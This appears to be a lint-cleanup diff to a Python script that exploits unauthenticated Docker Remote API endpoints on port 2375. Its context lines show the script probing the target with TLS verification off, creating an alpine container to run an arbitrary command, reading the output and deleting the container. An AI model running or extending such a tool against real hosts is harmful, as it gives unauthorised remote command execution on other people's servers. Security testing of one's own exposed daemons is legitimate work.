@@ -9,7 +9,6 @@ Port:   2375
 
 import argparse
 import sys
-import json
 import requests
 
 requests.packages.urllib3.disable_warnings()
@@ -22,7 +21,7 @@ def check_target(target):
         r = requests.get(url, timeout=10, verify=False)
         if r.status_code == 200:
             data = r.json()
-            print(f"[+] Docker API accessible!")
+            print("[+] Docker API accessible!")
             print(f"    Docker Version: {data.get('Version', 'Unknown')}")
             print(f"    API Version: {data.get('ApiVersion', 'Unknown')}")
             print(f"    OS/Arch: {data.get('Os', '?')}/{data.get('Arch', '?')}")
@@ -100,7 +99,7 @@ def execute_command(target, command, image="alpine:latest"):
     if r.status_code not in (200, 204):
         print(f"[-] Container start failed: HTTP {r.status_code}")
         return None
-    print(f"[+] Container started")
+    print("[+] Container started")
 
     # Wait for container to finish
     wait_url = f"{target}/containers/{container_id}/wait"
@@ -123,7 +122,7 @@ def execute_command(target, command, image="alpine:latest"):
     # Remove container
     remove_url = f"{target}/containers/{container_id}?force=true"
     requests.delete(remove_url, timeout=10, verify=False)
-    print(f"[+] Container cleaned up")
+    print("[+] Container cleaned up")
 
     return output
 
